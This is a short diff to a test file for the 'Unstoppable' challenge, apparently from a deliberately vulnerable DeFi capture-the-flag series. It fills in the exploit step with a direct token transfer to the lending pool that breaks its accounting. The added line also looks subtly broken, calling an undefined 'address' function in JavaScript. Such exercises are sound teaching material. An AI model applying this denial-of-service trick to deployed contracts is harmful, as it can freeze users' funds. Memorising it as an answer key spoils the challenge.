@@ -39,7 +39,8 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        //Directly transfer any of the attacker's 100 DVL tokens to the pool
+         await this.token.connect(attacker).transfer(address(this.pool), 1);
     });
 
     after(async function () {
